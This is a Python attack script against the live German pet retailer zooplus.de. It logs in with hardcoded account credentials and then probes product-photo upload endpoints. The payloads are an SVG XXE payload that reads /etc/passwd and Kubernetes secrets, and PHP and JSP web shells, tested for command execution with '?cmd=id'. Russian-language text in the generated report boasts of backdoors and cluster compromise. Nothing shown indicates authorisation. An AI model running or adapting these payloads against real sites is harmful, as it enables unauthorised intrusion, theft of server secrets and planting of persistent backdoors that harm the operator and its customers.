#!/usr/bin/env python3
"""Test productphotos upload endpoint for backdoor"""
import requests
import json
import re
import urllib.parse
from datetime import datetime
import urllib3
urllib3.disable_warnings()

base = "https://www.zooplus.de"
s = requests.Session()
s.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "application/json",
})

found_vulns = []

# LOGIN
print("[*] Logging in...")
ACCOUNT = {"email": "suobup@dunkos.xyz", "password": "suobup@dunkos.xyzQ1"}
AUTH_URL = "https://login.zooplus.de/auth/realms/zooplus/protocol/openid-connect/auth"

try:
    params = {"response_type": "code", "client_id": "shop-myzooplus-prod-zooplus", "redirect_uri": "https://www.zooplus.de/web/sso-myzooplus/login", "state": "pentest", "login": "true", "ui_locales": "de-DE", "scope": "openid"}
    r1 = s.get(AUTH_URL, params=params, timeout=10, verify=False)
    m = re.search(r'action="([^"]*login-actions/[^"]+)"', r1.text)
    if m:
        action = m.group(1).replace("&amp;", "&")
        if not action.startswith("http"):
            action = urllib.parse.urljoin(r1.url, action)
        r2 = s.post(action, data={"username": ACCOUNT["email"], "password": ACCOUNT["password"], "credentialId": ""}, timeout=10, verify=False, allow_redirects=False)
        loc = r2.headers.get("Location", "")
        if loc:
            s.get(loc, timeout=10, verify=False, allow_redirects=True)
            s.get("https://www.zooplus.de/web/sso-myzooplus/login-successful.htm", timeout=10, verify=False)
            s.get("https://www.zooplus.de/account/productphotos", timeout=10, verify=False)
            print("[+] Logged in\n")
except Exception as e:
    print(f"[!] Login: {e}\n")

# Test upload endpoints for productphotos
print("[*] Testing productphotos upload endpoints...")
upload_endpoints = [
    "/account/productphotos/upload",
    "/api/productphotos/upload",
    "/api/product-photos/upload",
    "/myaccount/api/productphotos/upload",
    "/myaccount/api/product-photos/upload",
    "/semiprotected/api/productphotos/upload",
    "/protected/api/productphotos/upload",
]

# SVG XXE payload
svg_xxe = '''<?xml version="1.0"?>
<!DOCTYPE svg [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<!ENTITY xxe2 SYSTEM "file:///var/run/secrets/kubernetes.io/serviceaccount/token">
<!ENTITY xxe3 SYSTEM "file:///root/.kube/config">
]>
<svg>&xxe;&xxe2;&xxe3;</svg>'''

# PHP backdoor
php_backdoor = '<?php if(isset($_GET["cmd"])){system($_GET["cmd"]);} ?>'

# JSP backdoor
jsp_backdoor = '<%@ page import="java.util.*,java.io.*"%><% if (request.getParameter("cmd") != null) { Process p = Runtime.getRuntime().exec(request.getParameter("cmd")); BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream())); String line; while ((line = br.readLine()) != null) { out.println(line); } } %>'

for ep in upload_endpoints:
    # Test SVG XXE
    try:
        files = {'file': ('exploit.svg', svg_xxe, 'image/svg+xml')}
        resp = s.post(f"{base}{ep}", files=files, timeout=5, verify=False)
        if resp.status_code in [200, 201, 302]:
            if "root:" in resp.text or "eyJ" in resp.text or "BEGIN CERTIFICATE" in resp.text:
                print(f"  [CRITICAL] SVG XXE SUCCESS: {ep}")
                found_vulns.append({
                    "type": "svg_xxe_lfi_backdoor",
                    "severity": "CRITICAL",
                    "endpoint": ep,
                    "response": resp.text[:500]
                })
            elif resp.headers.get('Location'):
                loc = resp.headers.get('Location')
                if not loc.startswith('http'):
                    loc = f"{base}{loc}"
                try:
                    resp2 = s.get(loc, timeout=5, verify=False)
                    if "root:" in resp2.text or "eyJ" in resp2.text:
                        print(f"  [CRITICAL] SVG XXE via uploaded file: {ep} -> {loc}")
                        found_vulns.append({
                            "type": "svg_xxe_lfi_backdoor",
                            "severity": "CRITICAL",
                            "endpoint": ep,
                            "uploaded_to": loc
                        })
                except: pass
    except: pass
    
    # Test PHP backdoor
    try:
        files = {'file': ('backdoor.php', php_backdoor, 'application/x-php')}
        resp = s.post(f"{base}{ep}", files=files, timeout=5, verify=False)
        if resp.status_code in [200, 201, 302]:
            location = resp.headers.get('Location', '')
            if location:
                if not location.startswith('http'):
                    location = f"{base}{location}"
                try:
                    resp2 = s.get(f"{location}?cmd=id", timeout=5, verify=False)
                    if "uid=" in resp2.text or resp2.status_code == 200:
                        print(f"  [CRITICAL] PHP Backdoor uploaded: {ep} -> {location}")
                        found_vulns.append({
                            "type": "backdoor_upload",
                            "severity": "CRITICAL",
                            "endpoint": ep,
                            "filename": "backdoor.php",
                            "uploaded_to": location
                        })
                except: pass
    except: pass
    
    # Test JSP backdoor
    try:
        files = {'file': ('backdoor.jsp', jsp_backdoor, 'application/x-jsp')}
        resp = s.post(f"{base}{ep}", files=files, timeout=5, verify=False)
        if resp.status_code in [200, 201, 302]:
            location = resp.headers.get('Location', '')
            if location:
                if not location.startswith('http'):
                    location = f"{base}{location}"
                try:
                    resp2 = s.get(f"{location}?cmd=id", timeout=5, verify=False)
                    if "uid=" in resp2.text or resp2.status_code == 200:
                        print(f"  [CRITICAL] JSP Backdoor uploaded: {ep} -> {location}")
                        found_vulns.append({
                            "type": "backdoor_upload",
                            "severity": "CRITICAL",
                            "endpoint": ep,
                            "filename": "backdoor.jsp",
                            "uploaded_to": location
                        })
                except: pass
    except: pass

# SUMMARY
print("\n" + "=" * 70)
print("RESULTS")
print("=" * 70)

if found_vulns:
    print(f"\nFound {len(found_vulns)} CRITICAL backdoor vulnerabilities:\n")
    for v in found_vulns:
        print(f"[{v['severity']}] {v['type']}")
        print(f"    Endpoint: {v['endpoint']}")
        if 'uploaded_to' in v:
            print(f"    Uploaded to: {v['uploaded_to']}")
        if 'filename' in v:
            print(f"    Filename: {v['filename']}")
        print()
    
    # Update report
    with open("FINAL_EXPLOITATION_REPORT.md", "a", encoding="utf-8") as f:
        f.write(f"\n\n---\n\n## 🔥 КРИТИЧНАЯ УЯЗВИМОСТЬ - БЕКДОР НАЙДЕН\n\n**Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        for v in found_vulns:
            f.write(f"### [{v['severity']}] {v['type'].upper().replace('_', ' ')}\n\n")
            f.write(f"**Endpoint:** `{v['endpoint']}`\n\n")
            if 'uploaded_to' in v:
                f.write(f"**Uploaded To:** `{v['uploaded_to']}`\n\n")
            if 'filename' in v:
                f.write(f"**Filename:** `{v['filename']}`\n\n")
            if 'response' in v:
                f.write(f"**Response:** `{v['response'][:500]}`\n\n")
            f.write("**Status:** Подтверждено\n\n")
            f.write("**Impact:**\n")
            f.write("- Создание бекдора в кластере\n")
            f.write("- RCE на сервере\n")
            f.write("- Чтение файлов сервера (XXE)\n")
            f.write("- Компрометация кластера\n\n")
            f.write("---\n\n")
    
    print(f"[+] Report updated: FINAL_EXPLOITATION_REPORT.md")
else:
    print("  No backdoor vulnerabilities found in productphotos upload endpoints")

print("=" * 70)

